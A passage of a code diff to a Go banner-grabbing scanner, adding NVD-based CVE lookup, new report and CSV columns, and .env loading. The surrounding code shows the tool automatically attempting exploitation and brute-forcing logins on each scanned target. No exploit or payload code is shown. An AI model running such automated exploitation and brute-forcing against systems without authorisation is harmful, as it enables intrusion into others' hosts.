 			report += fmt.Sprintf("Vulnerabilities: %s\n", strings.Join(r.Vulns, ", "))
 		}
+		if len(r.NVDVulns) > 0 {
+			report += fmt.Sprintf("CVE Found(NVD): %s\n", strings.Join(r.NVDVulns, ", "))
+		}
 		if len(r.Exploits) > 0 {
 			report += fmt.Sprintf("Exploits: %s\n", strings.Join(r.Exploits, ", "))
 		}
@@ -969,6 +1793,8 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 	tlsVer, cipher, issuer, cn := getTLSInfo(tlsState)
 
 	vulns := checkVulnerabilities(host, port, protocol, banner)
+	nvdVulns := checkVulnerabilitiesNVD(host, port, protocol, banner)
+
 	exploits := attemptExploitation(host, port, protocol, vulns)
 	enum := enumerateService(host, port, protocol)
 	brute := bruteForceService(host, port, protocol, userlist, passlist)
@@ -986,6 +1812,7 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 		CertIssuer:  issuer,
 		CertCN:      cn,
 		Vulns:       vulns,
+		NVDVulns:    nvdVulns,
 		Exploits:    exploits,
 		Enum:        enum,
 		Brute:       brute,
@@ -1005,6 +1832,7 @@ func grabBanner(host, port, protocol, payload string, timeout time.Duration, max
 		CertIssuer:  issuer,
 		CertCN:      cn,
 		Vulns:       vulns,
+		NVDVulns:    nvdVulns,
 		Exploits:    exploits,
 		Enum:        enum,
 		Brute:       brute,
@@ -1055,6 +1883,8 @@ func readLines(filename string) []string {
 }
 
 func main() {
+	loadDotEnv(".env")
+
 	asciiArt := `
 __________                                      ________                                        
 \______   \_____    ____   ____   ___________  /  _____/___________  ______        ____   ____  
@@ -1108,7 +1938,7 @@ __________                                      ________
 		targets = flag.Args()
 	}
 	if len(targets) == 0 {
-		fmt.Println(`Usage: go run bannerGrap.go
+		fmt.Print(`Usage: go run bannerGrap.go
 
     go run bannerGrap.go -h
 
@@ -1217,9 +2047,9 @@ __________                                      ________
 			}
 			defer f.Close()
 			w := csv.NewWriter(f)
-			w.Write([]string{"host", "port", "protocol", "banner", "fingerprint", "tls_version", "cipher", "cert_issuer", "cert_cn", "vulnerabilities", "exploits", "enumeration", "bruteforce", "report", "error"})
+			w.Write([]string{"host", "port", "protocol", "banner", "fingerprint", "tls_version", "cipher", "cert_issuer", "cert_cn", "vulnerabilities", "nvd_vulnerabilities", "exploits", "enumeration", "bruteforce", "report", "error"})
 			for _, r := range results {
-				w.Write([]string{r.Host, r.Port, r.Protocol, r.Banner, r.Fingerprint, r.TLSVersion, r.Cipher, r.CertIssuer, r.CertCN, strings.Join(r.Vulns, ";"), strings.Join(r.Exploits, ";"), strings.Join(r.Enum, ";"), strings.Join(r.Brute, ";"), r.Report, r.Error})
+				w.Write([]string{r.Host, r.Port, r.Protocol, r.Banner, r.Fingerprint, r.TLSVersion, r.Cipher, r.CertIssuer, r.CertCN, strings.Join(r.Vulns, ";"), strings.Join(r.NVDVulns, ";"), strings.Join(r.Exploits, ";"), strings.Join(r.Enum, ";"), strings.Join(r.Brute, ";"), r.Report, r.Error})
 			}
 			w.Flush()
 			fmt.Println("Wrote", *output)
@@ -1252,6 +2082,9 @@ __________                                      ________
 				}
 				if len(r.Vulns) > 0 {
 					fmt.Printf("  Vulnerabilities: %s\n", strings.Join(r.Vulns, ", "))
+				}
+				if len(r.NVDVulns) > 0 {
+					fmt.Printf("  CVE Found(NVD): %s\n", strings.Join(r.NVDVulns, ", "))
 				}
 				if len(r.Exploits) > 0 {
 					fmt.Printf("  Exploits: %s\n", strings.Join(r.Exploits, ", "))
